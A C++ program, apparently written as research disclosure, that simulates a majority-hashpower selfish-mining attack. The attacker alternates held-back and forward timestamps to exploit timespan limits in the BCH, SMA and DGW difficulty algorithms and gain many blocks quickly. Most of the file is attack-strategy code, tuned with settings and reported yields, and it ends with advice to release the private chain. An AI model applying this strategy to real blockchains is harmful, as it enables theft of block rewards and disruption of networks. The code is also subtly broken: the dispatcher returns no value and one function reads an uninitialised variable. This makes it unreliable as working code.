// Timespan Limit Attack Demonstration
// Copyright (c) Zawy 2019
// MIT License
/*
This demonstrates how a >50% selfish mining attack can get unlimited number of blocks in about 3x the 
difficulty window by retarding the MTP and using timespan limits against themselves. Works on 
any algos that use a timespan limit without requiring the timestamps be sequential.
It currently only tests symmetrical limits like DASH's 3x and 1/3. A future update may include the 
easier cases of fixed-window algos BTC and LTC which are easier to attack, and asymmetrical fractional limits.
See https://github.com/zawy12/difficulty-algorithms/issues/30
*/

#include <iostream>     // for cout
#include <math.h>		
#include <string>
#include <cstdint>
#include <bits/stdc++.h> // for array sort
using namespace std;
typedef int64_t u;
typedef double d; // instead of arith_256

float fRand(float fMin, float fMax) {   
		float f = (float)rand() / RAND_MAX;
    return fMin + f * (fMax - fMin);
}
u median(u a[], u n) { sort(a, a+n);   return a[n/2];  } 

d BCH(d targets[], u S[], u N, u T, u L, u h) {
	d sumTargets=0;
	u front_array[3] = {S[h-1],   S[h-2],   S[h-3]};
	u back_array[3]  = {S[h-1-N], S[h-2-N], S[h-3-N]};
	// BCH reduces out of sequence timstamps like this:
	u front = median( front_array, 3 );
	u back = median( back_array, 3 );
	// Here's the limit that allows the exploit.
	u timespan = min(L*N*T, max(N*T/L, front - back));
	
	// Identify the corresponding targets
	u j;
	if	(front == S[h-1])	{ j = h-1; }
	else if (front == S[h-2])	{ j = h-2; }
	else				{ j = h-3; }
	u k;
	if	(back == S[h-1-N])	{ k = h-1-N; }
	else if (back == S[h-2-N])	{ k = h-2-N; }
	else				{ k = h-3-N; }
	for (u i = j; i > k; i-- ) { sumTargets += targets[i]; }
	return sumTargets*timespan/T/(j-k)/(j-k); 
}
d SMA(d targets[], u S[], u N, u T, u L, u h) {
	d sumTargets=0;
	u timespan = min(L*N*T, max(N*T/L, S[h-1] - S[h-1-N]));
	for (u i = h-1; i>=h-N; i-- ) { sumTargets += targets[i]; }
	return sumTargets*timespan/T/N/N; 
}
d Digishield(d targets[], u S[], u N, u T, u L, u h) {
	// This does not include the MTP delay in Digishield that stops the attack.
	d sumTargets=0;
	u timespan = min(L*N*T, max(N*T/L, S[h-1] - S[h-1-N]));
	for (u i = h-1; i>=h-N; i-- ) { sumTargets += targets[i]; }
	return sumTargets*(3*N*T + timespan)/T/N/N; 
}
d DGW(d targets[], u S[], u N, u T, u L, u h) {
	d sumTargets=0;
	u timespan = min(L*N*T, max(N*T/L, S[h-1] - S[h-1-N]));
	for (u i = h-1; i>=h-N; i-- ) { sumTargets += targets[i]; }
 // The following makes DGW different from SMA: double weight to most recent target.
	sumTargets +=targets[h-1];
	return sumTargets*timespan/T/N/(N+1);  
}
d LWMA(d targets[], u S[], u N, u T, u L, u h) {
	// not currently supported because the attack needs to be modified
	d sumTargets=0;
	u weighted_sum_time;
	for (u i = h-1; i>=h-N; i--) { weighted_sum_time += min(6*T,max(-6*T,(S[i]-S[i-1]))); }
	for (u i = h-1; i>=h-N; i-- ) { sumTargets += targets[i]; }
	return sumTargets*weighted_sum_time*2/T/N/N/(N+1); 
}
d run_DA (string choose_DA, d targets[], u S[], u N, u T, u L, u h) {
	if (choose_DA == "BCH") { BCH(targets, S, N, T, L, h); }
	if (choose_DA == "SMA" ) { SMA(targets, S, N, T, L, h); }
	if (choose_DA == "DGW" ) { DGW(targets, S, N, T, L, h); }
/*	if (choose_DA == "Digishield" ) { Digishield(targets, S, N, T, L, h); }
	if (choose_DA == "LWMA" ) { LWMA(targets, S, N, T, L, h); }
	if (choose_DA == "Boris" ) { Boris(targets, S, N, T, L, h); }
	if (choose_DA == "BTC" ) { BTC(targets, S, N, T, L, h); }
	if (choose_DA == "LTC" ) { LTC(targets, S, N, T, L, h); }
	if (choose_DA == "ETH" ) { ETH(targets, S, N, T, L, h); }   */
}
int main () {
srand(time(0));

u test_DA = 0; // set to 1 to test DA code without the attack

u N = 20; // difficulty averaging window, use > MTP
u L = 2; // timespan limit. BTC=4, BCH=2, DASH / DGW=3. Symmetrical assumed.
u T = 100; // block time
u MTP = 11; // most coins use MTP=11 (median of the past 11 timestamps)

// The following is adjusted to increase the # of blocks gained and decrease the time required.
// Select a target number of blocks (via blocks = 10*N below) then keep adjusting it.

u adjust = 115;  // This is critical. A change of 1% can double the blocks. Typical range: 25 to 150.
u try_all_adjusts = 0; // Set to 1 if you want it to try adjust settings 24 to 150.

string choose_DA = "BCH"; // currently supports BCH, SMA, or DGW

if (choose_DA == "BCH" ) { T=600; N=144; L=2; }  // BCH adjust = 103 got 70k blocks in 3.5 days; 
if (choose_DA == "DGW" ) { N=24; L=3; }   // DGW.  Adjust = 25 got a lot

u blocks = 1000; // How many blocks to get. (try = 3*N at first)

u S[blocks + N + MTP]; // S = stamps = timestamps
u real_time[blocks + N + MTP];
// Using doubles to avoid arith_256 header.
d solvetime = 0; // for keeping track of real time
d targets[blocks + N + MTP];
d public_HR = 100000; // Hashes per second
d attacker_HR = 1; // attacker's HR as fraction of public_HR without him (1=50% attack, 2 = 66%) 
d leading_zeros = 32; // 32 for BTC
d powLimit = pow(2,256-leading_zeros);
d difficulty; 
d avg_initial_diff = public_HR*T/pow(2,leading_zeros);
assert( MTP % 2 == 1); // allow only odd for easily finding median

// h = height, S[] = timestamps

cout << "Initialize N + MTP blocks:\nheight,\ttimestamps,\tdifficulty,\ttarget,\treal time,\tsolvetime\n"; 

// Initialize N+1 targets and timestamps before attack begins. 
S[0]=0; // typically 0 or time(0)
real_time[0] = S[0]; 
targets[0]=pow(2,256)/public_HR/T;
u do_things_proper_which_makes_results_harder_to_understand = 0;
for (u h=1; h<N+MTP; h++) { 
	if (do_things_proper_which_makes_results_harder_to_understand) {
		solvetime = u(round(T*log( 1/fRand(0,1))));
	}
	else { solvetime=T; } // the smarter choice
	S[h] = S[h-1] + solvetime;
	real_time[h] = real_time[h-1] + solvetime;
	// Make targets initially perfect as close approximation.
	targets[h] = pow(2,256)/public_HR/T; 
	difficulty = powLimit/targets[h];
	cout << h << ",\t" << S[h] << ",\t" << difficulty << ",\t" << targets[h] << ",\t" << real_time[h] 
	<< ",\t" << S[h]-S[h-1] << endl; 
   // cout << h << " " << S[h] << " " <<  round(1000*difficulty/avg_initial_diff)/1000 << " " << solvetime << endl;
}

if (test_DA == 1) { cout << "Begin testing difficulty calculations.\n"; }
else { cout << "Begin attack.\n height, timestamp, MTP, normalized difficulty, " <<
	"solvetime, real time, minutes into attack\n";
}
u min_adj = adjust;
u max_adj = adjust;
if (try_all_adjusts && !test_DA) { min_adj = 24; max_adj = 300; }

for (u adjust = min_adj; adjust <= max_adj; adjust++) 
{ 
u h=0;
u MTP_array[MTP];
u MTP_next = 1; 
u MTP_previous = 0;
u j = 0;
d sumTimeWeightedTarget=0; 
d sumDiffs=0;
d maxTimestamp=0;

u M = L*N*T; // A useful constant
// The following is the attacker's first timestamp. It is forward in time, but 
// it becomes the "held-back" MTP that is the key to the attack's success
u Q = S[N+MTP-N] + M*adjust/100; 
for (h = N+MTP; h < blocks+N+MTP; h++ ) {
	// Apply difficulty algorithm
	targets[h] = run_DA(choose_DA, targets, S, N, T, L, h);
	
	// Get randomized solvetime for this target and HR to keep track of real time
	solvetime = pow(2,256)/ targets[h] / public_HR * log( 1/fRand(0,1) )/attacker_HR ;
	real_time[h] = round(real_time[h-1] + solvetime);

	if (test_DA) {  // for testing DA without the attack
		S[h] = solvetime + S[h-1];  
		cout << h << ",\t" << S[h] << ",\t" << powLimit/targets[h] << ",\t" << targets[h] << ",\t" << S[h]-S[h-1] << endl;
	}
	else {
		// Begin attacker code to determine best timestamp to assign.

		// Attacker alternates timestamps to be Q and Q+M, but before using
		// the 2nd (which lowers the difficulty), he has to make sure 
		// MTP_previous + 1 <= MTP_next to not violate protocol and 
		// MTP_next <= Q to keep the attack alive and well by retarding MTP.

		// First N blocks can be done a certain way to maximize future gains.
		if ( j==0 ) { S[h]= Q; } // begin attack 
		else if ( j <= N ) {
			// Calculate MTP of next block
			MTP_array[0] = M+S[h-N];  // old: min(Q + M, M+S[h-N]);
			for (u i = 1; i<MTP; i++) { MTP_array[i] = S[h-i]; }
			MTP_next = median(MTP_array, MTP); 

			// This is the key code for 1st N blocks.
			if ( MTP_next <= Q && MTP_next >= MTP_previous &&
				Q == S[h-1]+1 ) { S[h] =  M + S[h-N]; } // jumps to a forward time if MTP is safely delayed.
			else { S[h] = Q; }  // holds back the MTP
		}
		// After 1st N blocks, do the sustained attack pattern.
		// It's possible to use the following alone to replace the above, but 
		// may take 2x longer in some algos. 
		else  {
			MTP_array[0] = Q + M;
			for (u i = 1; i<MTP; i++) { MTP_array[i] = S[h-i]; }
			MTP_next = median(MTP_array, MTP); 
			
			// This is the key code for the sustained attack.
			if ( MTP_next <= Q && MTP_next >= MTP_previous && 
					Q == S[h-N]+N )  {  S[h] = M + Q;  }  // jumps to our forward "submit" time if MTP is safely delayed.
			else { S[h] = Q;  }  // holds back the MTP
		}
		Q += 1; // Because protocol requires timestamps >= MTP + 1 second 

		for (u i = 1; i<=MTP; i++) { MTP_array[i] = S[h-i];  }
		MTP_previous = median(MTP_array, MTP);
	
		difficulty = powLimit/targets[h];
		sumDiffs += difficulty;
		sumTimeWeightedTarget += targets[h]*solvetime; 
		if (!try_all_adjusts) {
			cout << h << "\t" << S[h] << "\t" << MTP_previous << "\t" 
			<< round(1000*difficulty/avg_initial_diff)/1000 << "\t" << round(solvetime) 
			<< "\t" << real_time[h] << "\t"<< round(10*(real_time[h] - real_time[MTP+N-1])/60)/10 
			<< endl;
		}

		// Double check the code
		for (u i = 0; i<MTP; i++) { MTP_array[i] = S[h-i];  }
		MTP_next = median(MTP_array, MTP);

		if (MTP_next < MTP_previous) { cout << "MTP_next (" << MTP_next << ") is smaller than " 
		<< MTP_previous << ". Adjust setting was too small.\n"; break;}

		if (S[h] > maxTimestamp) { maxTimestamp = S[h]; }
		if ( maxTimestamp < real_time[h] && j > 1.5*N ) {
			if (!try_all_adjusts) {
				cout << "\nReal time has caught up with the forwarded timestamps.";
				cout << "Send the private chain to public nodes or increase 'adjust' to ";
				cout << "get more blocks in possibly a lot less time.\n";
			}
			break;
		}
	}
	j++;
} //  end loop based on height

if (test_DA != 1 && !try_all_adjusts) { cout << "\nheight, timestamp, MTP, normalized Difficulty, " << 
	"solvetime, real time, minutes into attack\n"; 
}
d tw_norm_diff = powLimit/avg_initial_diff*(real_time[j-1+N+MTP]-real_time[N+MTP-1])/sumTimeWeightedTarget;
if (!try_all_adjusts) {
	cout << "\nAvg solvetime: " << (real_time[j-1+N+MTP]-real_time[N+MTP-1])/j << " seconds\n"; 
	cout << "Time-weighted normalized difficulty: " << tw_norm_diff <<	endl; 
	cout << "Average normalized difficulty: " << sumDiffs/avg_initial_diff/j << endl;
}
else if (maxTimestamp < real_time[h-1]+2*T ){
	cout << adjust << " " << j << " " << maxTimestamp-S[N+MTP-1] << " " << real_time[h-1]-S[N+MTP-1] << " " 
	<< round(100*real_time[h-1]/3600)/100 << " " << tw_norm_diff << endl;
}
} // end trying each adjust
if (try_all_adjusts) { 
	cout << "adjust, blocks, max tamestamp, real time, attack hours, avg normalized difficulty\n";
}
return(0);
}